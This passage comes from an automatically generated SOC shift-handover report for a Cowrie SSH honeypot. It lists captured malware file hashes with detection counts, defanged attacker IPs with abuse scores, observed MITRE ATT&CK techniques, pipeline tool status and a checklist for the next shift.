| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `147.45.145[.]178` | NL | Timeweb, LLP | **100** ⚠️ | 0 |
| `39.129.209[.]216` | CN | China Mobile Communications Corporation | **100** ⚠️ | 20 |
| `192.241.179[.]235` | US | DigitalOcean, LLC | **100** ⚠️ | 17 |
| `165.22.184[.]62` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `89.36.2[.]59` | ES | PROCONO S.A. | **100** ⚠️ | 7 |
| `95.231.249[.]182` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 16 |
| `183.56.235[.]140` | CN | CHINANET Guangdong province network | **100** ⚠️ | 10 |
| `3.132.26[.]232` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `211.105.129[.]57` | KR | Korea Telecom | **100** ⚠️ | 37 |
| `180.93.172[.]213` | VN | Saigon Postel Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 137 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 60 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 30 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 145 cases |
| Tool 34  | Credential Extractor        | ✅ 124 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 60 priority case(s) shown individually · 14 recon entry/entries in table (9 group(s) consolidating 78 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T05:48:27Z_
